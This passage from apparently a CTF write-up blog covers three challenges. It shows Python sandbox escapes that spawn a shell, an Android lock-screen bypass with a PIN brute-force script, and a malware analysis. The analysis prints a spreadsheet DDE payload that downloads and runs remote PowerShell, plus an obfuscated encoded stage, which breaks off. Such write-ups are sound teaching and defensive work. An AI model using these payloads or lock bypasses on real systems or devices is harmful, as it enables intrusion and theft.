_tryorder:</span><br><span class="line">        browser = get(name)</span><br><span class="line">        <span class="keyword">if</span> browser.<span class="built_in">open</span>(url, new, autoraise):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>Continue to track <code>register_standard_browsers</code> to find that it checks the <code>BROWSER</code> environment variable in <code>os.environ</code><br><a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L585">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L585</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;BROWSER&quot;</span> <span class="keyword">in</span> os.environ:</span><br><span class="line">    userchoices = os.environ[<span class="string">&quot;BROWSER&quot;</span>].split(os.pathsep)</span><br><span class="line">    userchoices.reverse()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Treat choices in same way as if passed into get() but do register</span></span><br><span class="line">    <span class="comment"># and prepend to _tryorder</span></span><br><span class="line">    <span class="keyword">for</span> cmdline <span class="keyword">in</span> userchoices:</span><br><span class="line">        <span class="keyword">if</span> cmdline != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            cmd = _synthesize(cmdline, preferred=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">if</span> cmd[<span class="number">1</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                register(cmdline, <span class="literal">None</span>, GenericBrowser(cmdline), preferred=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>Where <code>GenericBrowser</code> can run <code>cmdline</code><br><a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L181">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L181</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GenericBrowser</span>(<span class="title class_ inherited__">BaseBrowser</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Class for all browsers started with a command</span></span><br><span class="line"><span class="string">       and without remote functionality.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(name, <span class="built_in">str</span>):</span><br><span class="line">            self.name = name</span><br><span class="line">            self.args = [<span class="string">&quot;%s&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># name should be a list with arguments</span></span><br><span class="line">            self.name = name[<span class="number">0</span>]</span><br><span class="line">            self.args = name[<span class="number">1</span>:]</span><br><span class="line">        self.basename = os.path.basename(self.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">self, url, new=<span class="number">0</span>, autoraise=<span class="literal">True</span></span>):</span><br><span class="line">        sys.audit(<span class="string">&quot;webbrowser.open&quot;</span>, url)</span><br><span class="line">        cmdline = [self.name] + [arg.replace(<span class="string">&quot;%s&quot;</span>, url)</span><br><span class="line">                                 <span class="keyword">for</span> arg <span class="keyword">in</span> self.args]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> sys.platform[:<span class="number">3</span>] == <span class="string">&#x27;win&#x27;</span>:</span><br><span class="line">                p = subprocess.Popen(cmdline)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = subprocess.Popen(cmdline, close_fds=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">not</span> p.wait()</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>final exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;antigravity&#x27;</span>,<span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>),<span class="string">&#x27;environ&#x27;</span>,<span class="built_in">dict</span>(BROWSER=<span class="string">&#x27;/bin/sh -c &quot;/readflag giveflag&quot; #%s&#x27;</span>))) </span><br></pre></td></tr></table></figure>

<h4 id="Method-4-Let-import-load-getattr-to-take-effect-by-restoring-sys-modules"><a href="#Method-4-Let-import-load-getattr-to-take-effect-by-restoring-sys-modules" class="headerlink" title="Method 4 Let __import__ load getattr to take effect by restoring sys.modules:"></a>Method 4 Let <code>__import__</code> load getattr to take effect by restoring sys.modules:</h4><p>Since <code>__import__</code> will first look for <code>sys.modules</code> <a href="https://github.com/python/cpython/blob/48ec678287a3be1539823fa3fc0ef457ece7e1c6/Lib/importlib/_bootstrap.py#L1101">https://github.com/python/cpython/blob/48ec678287a3be1539823fa3fc0ef457ece7e1c6/Lib/importlib/_bootstrap.py#L1101</a> when loading, you can first override <code>sys.modules</code> by <code>setattr</code> <code>__builtins__</code>, so that <code>__import__</code> can call <code>getattr</code>. Through <code>getattr</code>, <code>os.system</code> can be loaded. Since it is banned, you can use <code>__import__(&#39;os&#39;), &#39;system&#39;</code>, and then pass the parameter <code>&#39;sh&#39;</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>),<span class="string">&#x27;modules&#x27;</span>,__builtins__) <span class="keyword">or</span> <span class="built_in">__import__</span>(<span class="string">&#x27;getattr&#x27;</span>)(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>),<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>Thanks to lrh2000,UnblvR,maple3142 help for this article</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Misc</tag>
        <tag>CTF</tag>
        <tag>Pyjail</tag>
      </tags>
  </entry>
  <entry>
    <title>Writeup of Flag Thief in WMCTF 2021</title>
    <url>/2021/08/30/Writeup-of-Flag-Thief-in-WMCTF-2021/</url>
    <content><![CDATA[<h1 id="Writeup-of-Flag-Thief-in-WMCTF-2021"><a href="#Writeup-of-Flag-Thief-in-WMCTF-2021" class="headerlink" title="Writeup of Flag Thief in WMCTF 2021"></a>Writeup of Flag Thief in WMCTF 2021</h1><h2 id="preface"><a href="#preface" class="headerlink" title="preface:"></a>preface:</h2><p>在两天前的WMCTF2021中我和th31nk共同解决了一个名为Flag Thief的取证挑战并且获得了该题目类型的一血</p>
<p><img src="https://i.imgur.com/DmO64JG.png" alt="first blood"></p>
<h2 id="description"><a href="#description" class="headerlink" title="description:"></a>description:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2021年8月28日 01:00 UTC，著名Flag大盗L1near被缉拿归案。警方已经将其作案用的电脑制作成镜像，他们试图找到L1near藏匿在其中的Flag但都以失败告终。警方知道你是取证专业人士，现在需要你的帮助！</span><br><span class="line"></span><br><span class="line">On August 28, 2021, at 01:00 UTC, The famous Flag thief L1near was arrested. Police have made a mirror image of the computer he used to commit the crime, and they have tried unsuccessfully to find the Flag that L1near was hiding inside. The police know you&#x27;re a forensics professional, now they need your help!</span><br><span class="line"></span><br><span class="line">Attachment: Baidu Drive(Code:m8yx) Or Google Drive</span><br><span class="line"></span><br><span class="line">the 7z&#x27;s passowrd is ec19b53ce10adc41be119713ffe34760</span><br><span class="line"></span><br><span class="line">Flag Thief hint1：经过警方长达一天的审讯，L1near交代他曾经对受害人的电脑远程操控过</span><br></pre></td></tr></table></figure>

<p>通过 hint 注意到远程连接的bmc位图缓存，路径如下：</p>
<p><img src="https://i.imgur.com/lQ6NqNF.png" alt="bmc位图缓存地址路径"></p>
<p>利用<code>bmc-tools</code>恢复缓存的 bmc 位图，通过大概浏览可以得到其中存在记事本的界面，里面包含着 veracrypt 的字样，那么将其拼接得到： </p>
<p><img src="https://i.imgur.com/H44gBCy.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VeraCrypt</span><br><span class="line"></span><br><span class="line">5eCuri7yPaSsW0rd@__WMCTF</span><br><span class="line"></span><br><span class="line">Oh no! U found it!</span><br></pre></td></tr></table></figure>

<p>那么就需要找到能让我们解密的 veracrypt 容器，这里通过取证大师的加密文件分类定位到一个可疑的文件：</p>
<p><img src="https://i.imgur.com/wedFU0E.png"></p>
<p>将其利用之前得到的秘钥挂载得到<code>nox-disk2.vmdk</code>，通过名称可以得知是夜神模拟器的数据盘，将其挂载在模拟器中即可打开，发现存在锁屏密码：</p>
<p><img src="https://i.imgur.com/wO9ptGw.png"></p>
<p>这里通过删除vmdk中的 gatekeeper.pattern.key  gatekeeper.password.key  以及 device_policies.xml  文件可以绕过锁屏直接进入，查看通讯录发现：</p>
<p><img src="https://i.imgur.com/Ajd2KjA.png"></p>
<p><img src="https://i.imgur.com/vTQ8Yat.png"></p>
<p>可恶还是需要锁屏密码,非预期方法被防了 :sob: :sob:</p>
<p>那么我们再来看锁屏密码，这里参考中科实数杯的考点：<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxODA3NDc3NA==&amp;mid=2247484582&amp;idx=1&amp;sn=716471f5440de7305ae1a8075e5c7bf9">https://mp.weixin.qq.com/s?__biz=MzAxODA3NDc3NA==&amp;mid=2247484582&amp;idx=1&amp;sn=716471f5440de7305ae1a8075e5c7bf9</a></p>
<p>X-ways先提取<code>/system/device_policies.xml</code>以确认密码为9位：</p>
<p><img src="https://i.imgur.com/D6Yo8Hd.png"></p>
<p><img src="https://i.imgur.com/OXbRSdj.png"></p>
<p>然后提取 gatekeeper.pattern.key ，计算哈希并爆破密码，那么我们首先生成字典（9位不重复数字）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line">file1 = <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">                                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;123456789&quot;</span>:</span><br><span class="line">                                    <span class="keyword">if</span> a != b <span class="keyword">and</span> a != c <span class="keyword">and</span> a != d <span class="keyword">and</span> a != e <span class="keyword">and</span> a != f <span class="keyword">and</span> a != g <span class="keyword">and</span> a != h <span class="keyword">and</span> a != i \</span><br><span class="line">                                            <span class="keyword">and</span> b != c <span class="keyword">and</span> b != d <span class="keyword">and</span> b != e <span class="keyword">and</span> b != f <span class="keyword">and</span> b != g <span class="keyword">and</span> b != h <span class="keyword">and</span> b != i \</span><br><span class="line">                                            <span class="keyword">and</span> c != d <span class="keyword">and</span> c != e <span class="keyword">and</span> c != f <span class="keyword">and</span> c != g <span class="keyword">and</span> c != h <span class="keyword">and</span> c != i\</span><br><span class="line">                                            <span class="keyword">and</span> d != e <span class="keyword">and</span> d != f <span class="keyword">and</span> d != g <span class="keyword">and</span> d != h <span class="keyword">and</span> d != i\</span><br><span class="line">                                            <span class="keyword">and</span> e != f <span class="keyword">and</span> e != g <span class="keyword">and</span> e != h <span class="keyword">and</span> e != i\</span><br><span class="line">                                            <span class="keyword">and</span> f != g <span class="keyword">and</span> f != h <span class="keyword">and</span> f != i\</span><br><span class="line">                                            <span class="keyword">and</span> g != h <span class="keyword">and</span> g != i\</span><br><span class="line">                                            <span class="keyword">and</span> h != i:</span><br><span class="line">                                        password = a + b + c + d + e + f + g + h + i</span><br><span class="line">                                        file1.write(password + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">file1.close()</span><br></pre></td></tr></table></figure>
<p>爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> scrypt</span><br><span class="line"></span><br><span class="line">N = <span class="number">16384</span></span><br><span class="line">r = <span class="number">8</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;gatekeeper.pattern.key&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">blob = f.read()</span><br><span class="line">s = struct.Struct(<span class="string">&#x27;&lt;&#x27;</span> + <span class="string">&#x27;17s 8s 32s&#x27;</span>)</span><br><span class="line">(meta, salt, signature) = s.unpack_from(blob)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">lines = f1.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):</span><br><span class="line">    password = lines[i][:-<span class="number">2</span>]</span><br><span class="line">    to_hash = meta</span><br><span class="line">    to_hash += password</span><br><span class="line">    <span class="built_in">hash</span> = scrypt.<span class="built_in">hash</span>(to_hash, salt, N, r, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;password: %s&#x27;</span> % password)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;signature: %s&#x27;</span> % binascii.hexlify(signature))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hash:      %s&#x27;</span> % binascii.hexlify(<span class="built_in">hash</span>[<span class="number">0</span>:<span class="number">32</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Equal:     %s&#x27;</span> % (<span class="built_in">hash</span>[<span class="number">0</span>:<span class="number">32</span>] == signature))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span>[<span class="number">0</span>:<span class="number">32</span>] == signature:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
<p>得到密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password:  183492765</span><br><span class="line">signature  fc677bebe8884278575c19a79a7f0efbab47f2e4dd73d43564adc17373fea9e7</span><br><span class="line">Hash:      fc677bebe8884278575c19a79a7f0efbab47f2e4dd73d43564adc17373fea9e7</span><br><span class="line">Equal:     True</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<p>锁屏验证后发现可以解开</p>
<p>(当然上述的部分也可以使用hashcat进行爆破,速度应该比这个脚本要快上不少)</p>
<p>那么猜测接下来的过程是利用解得的锁屏作为密钥来解密文：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher: BS7nX1uw+KmS4LSXlK3LIntByEturqY4qjGI/yj3Di8aps4K+DR9hCzndjUD7w54</span><br><span class="line">key: 183492765</span><br></pre></td></tr></table></figure>

<p>AES 解密<br><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p>
<p><img src="https://i.imgur.com/HFyjTYM.png"></p>
<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmctf&#123;dc4fc81e0aedc4692a7e312ce503e3ef&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Misc</tag>
        <tag>CTF</tag>
        <tag>Forensics</tag>
        <tag>Android</tag>
        <tag>BMC-Cache</tag>
      </tags>
  </entry>
  <entry>
    <title>idek CTF 2022* Forensics - HiddenGem Mixtape Writeup</title>
    <url>/2023/01/16/idek-CTF-2022-Forensics-HiddenGem-Mixtape-Writeup/</url>
    <content><![CDATA[<h1 id="idek-CTF-2022-Forensics-HiddenGem-Mixtape-Writeup"><a href="#idek-CTF-2022-Forensics-HiddenGem-Mixtape-Writeup" class="headerlink" title="idek CTF 2022* Forensics - HiddenGem Mixtape Writeup"></a>idek CTF 2022* Forensics - HiddenGem Mixtape Writeup</h1><p>This week is the Preliminary Eve in China, and most of my time is resting and partying. At the same time, there are some good challenges in idek CTF, among which I prefer the HiddenGem Mixtape series of challenges. Since I am a forensics enthusiast, and I I am also a malware analyst. So I prefer this challenge that is close to the realworld. Although some people may feel that this challenge is strange,guessing. Including some designs that may confuse the players. I hope my writeup can let you learn more much.Let’s gooooo</p>
<p>And a digression: szymex73 so strong! █Bquanman█ so strong!</p>
<h1 id="HiddenGem-Mixtape"><a href="#HiddenGem-Mixtape" class="headerlink" title="HiddenGem Mixtape:"></a>HiddenGem Mixtape:</h1><p>After downloading the file, we got three files <code>2023-01-07T194857_HiddenGem.zip</code>,<code>Note.txt</code>,<code>HiddenGem.7z</code></p>
<p><code>2023-01-07T194857_HiddenGem.zip</code> after decompression is <code>2023-01-07T194857_HiddenGem.vhdx</code></p>
<p>Note.txt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Note 1: All flags are wrapped in idek&#123;&#125; format, you don&#x27;t need to do it yourself.</span><br><span class="line">Note 2: The zip file is the same for all Mixtape. </span><br><span class="line">HiddenGem.pcapng is mainly for `HiddenGem Mixtape 3: The Ultimate Goal` however it may contain data for the rest of HiddenGem Mixtape. </span><br><span class="line">Note 3: Password for HiddenGem.pcapng will be released with Mixtape2 and 3</span><br></pre></td></tr></table></figure>

<p><code>HiddenGem.7z</code> needs a password, which is the traffic package. The password is <code>94cjFEJdMrZ&amp;YI)s94cjFEJdMrZ&amp;YI)s</code></p>
<h2 id="HiddenGem-Mixtape-1-Initial-Access"><a href="#HiddenGem-Mixtape-1-Initial-Access" class="headerlink" title="HiddenGem Mixtape 1: Initial Access:"></a>HiddenGem Mixtape 1: Initial Access:</h2><p>File <code>2023-01-07T194857_HiddenGem.vhdx</code> and find that it is</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-01-07T194857_HiddenGem.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0xe, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1</span><br></pre></td></tr></table></figure>

<p>First, I found the vhdx I got, but it seems that the direct analysis of autopsy failed because it modified some offsets or erased some information, so I used Diskgeniu to open the disk file first, and then restore the file system. Then take the logicfiles of Autopsy for analysis, the approximate effect is as follows:</p>
<p><img src="https://i.imgur.com/XvXgQ6R.png"></p>
<p><img src="https://i.imgur.com/qKS6Oaz.png"></p>
<h3 id="Email"><a href="#Email" class="headerlink" title="Email:"></a>Email:</h3><p>Since <code>Initial Access</code> is mentioned in the title description, it can be imagined that there may be some initial implants, and autopsy’s analysis indicates that there are email messages</p>
<p><img src="https://i.imgur.com/c91cUUM.png"></p>
<p>After extraction, the mail information is as follows, with the attached <code>Policy.7z</code> and the password <code>Privacy4411@2023!!!</code></p>
<p><img src="https://i.imgur.com/fo1SNJL.png"></p>
<p>Save it as 7z and decompress it with a password to get Policy.xlsx, continue to analyze the xlsx file</p>
<h3 id="Policy-xlsx"><a href="#Policy-xlsx" class="headerlink" title="Policy.xlsx:"></a>Policy.xlsx:</h3><p>After decompression, it can be observed that there are some xlsx in it. After checking that there is no template injection and CVE, you can refer to whether there is DDE.<br>exists in <code>xl\externalLinks\externalLink1.xml</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;externalLink xmlns=&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot; xmlns:mc=&quot;http://schemas.openxmlformats.org/markup-compatibility/2006&quot; mc:Ignorable=&quot;x14&quot; xmlns:x14=&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main&quot;&gt;&lt;ddeLink xmlns:r=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot; ddeService=&quot;cmd&quot; ddeTopic=&quot;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&amp;quot;http://172.21.20.96/windowsupdate.ps1\&amp;quot;);IEX $e&quot;&gt;&lt;ddeItems&gt;&lt;ddeItem name=&quot;_xlbgnm.A1&quot; advise=&quot;1&quot;/&gt;&lt;ddeItem name=&quot;StdDocumentName&quot; ole=&quot;1&quot; advise=&quot;1&quot;/&gt;&lt;/ddeItems&gt;&lt;/ddeLink&gt;&lt;/externalLink&gt;</span><br></pre></td></tr></table></figure>

<p>Specifically, you can know that the command <code>cmd /c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&quot;http://172.21.20.96/windowsupdate.ps1\&quot;);IEX $e</code> The commands to run powershell hidden and get content from <code>http://172.21.20.96/windowsupdate.ps1</code> and execute<br>from <code>windowsupdate.ps1</code></p>
<p>you can also choose some online sandboxes to run and get the command</p>
<p>like any.run: </p>
<p><a href="https://app.any.run/tasks/227c2a3f-8be3-443a-9a55-b4f5e8406e17">https://app.any.run/tasks/227c2a3f-8be3-443a-9a55-b4f5e8406e17</a></p>
<p><img src="https://i.imgur.com/KuMZVd9.png"></p>
<p>(toooo easy,right?)</p>
<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell:"></a>Powershell:</h3><p>Through the clues we found above <code>http://172.21.20.96/windowsupdate.ps1</code>, but this is a private ip that cannot be accessed, and then put it in autopsy to search, and found that there are some log information in the subsequent stage</p>
<p><img src="https://i.imgur.com/YKE79E3.png"></p>
<p>Its log files are located under: <code>C:/Windows/System32/winevt/logs/</code> Extract the <code>Microsoft-Windows-Sysmon%4Operational.evtx</code> log and load it with <code>Event Log Explorer</code></p>
<p><img src="https://i.imgur.com/4UVwUri.png"></p>
<p>You can get the follow-up payload from <code>windowsupdate.ps1</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; ( $sHEllid[1]+$sheLLiD[13]+&#x27;X&#x27;)( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::FRomBase64STRINg( &#x27;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